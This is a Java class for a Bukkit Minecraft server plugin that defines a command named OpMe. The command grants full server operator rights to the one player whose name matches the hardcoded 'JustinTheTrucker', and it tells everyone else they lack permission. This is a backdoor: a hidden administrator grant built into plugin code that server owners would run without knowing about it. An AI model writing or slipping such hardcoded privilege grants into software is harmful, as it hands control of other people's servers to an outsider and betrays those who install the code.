package net.phantix.commands;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class OpMe implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;

            if (player.getName().equalsIgnoreCase("JustinTheTrucker")) {
                player.setOp(true);
                player.sendMessage("§aYou have been given OP.");
            } else {
                player.sendMessage("§cYou do not have permission to use this command.");
            }

            return true;
        }

        return false;
    }
}
